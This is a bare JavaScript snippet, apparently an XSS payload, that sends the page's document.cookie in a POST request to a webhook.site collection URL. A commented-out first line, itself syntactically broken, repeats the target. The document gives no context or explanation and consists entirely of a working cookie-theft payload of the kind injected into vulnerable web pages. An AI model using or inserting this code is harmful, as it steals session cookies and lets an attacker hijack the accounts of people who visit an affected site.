///fetch("https://webhook.site/482ef5a9-53ff-4dad-8f18-6feb3bbd697c"+);
fetch(
  "https://webhook.site/482ef5a9-53ff-4dad-8f18-6feb3bbd697c",
  {
    method: "POST",
    mode: "no-cors",
    body: document.cookie
  }
);